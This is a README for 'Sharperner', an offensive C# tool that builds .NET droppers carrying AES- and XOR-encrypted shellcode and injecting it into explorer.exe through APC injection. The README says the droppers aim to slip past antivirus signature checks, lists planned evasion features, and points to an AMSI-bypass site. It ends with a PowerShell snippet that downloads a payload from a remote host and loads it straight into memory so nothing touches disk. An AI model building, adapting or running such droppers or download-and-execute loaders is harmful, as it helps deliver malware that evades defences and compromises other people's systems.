# Sharperner
**Sharperner** is a tool written in CSharp that generate .NET dropper with AES and XOR obfuscated shellcode. Generated executable can possibly bypass signature check but I cant be sure it can bypass heuristic scanning. 

![](./src/images/scan.PNG)

### Functionalities
* AES + XOR encrypted shellcode
* APC Process Injection (explorer.exe)

### Usage
```
/file         B64 shellcode file
/key        XOR Key (Optional)
/out        Output file Location (Optional)

Example:
Sharperner.exe /file:file.txt
Sharperner.exe /file:file.txt /key:'l0v3151nth3a1ry000www' /out:payload.exe
```

### To-do
* Implement c++ dropper
* Supports raw payload as input
* Implement direct syscalls
* Process Hollowing, PID spoofing

### Suggestion
To avoid touching the disk, Generated .NET executable can be loaded reflectively with powershell. AMSI is the enemy now, [amsi.fail](https://amsi.fail) ftw!
```powershell
$data = (New-Object System.Net.WebClient).DownloadData('http://10.10.10.10/payload.exe')
$assem = [System.Reflection.Assembly]::Load($data)
[beacon.Program]::Main()
```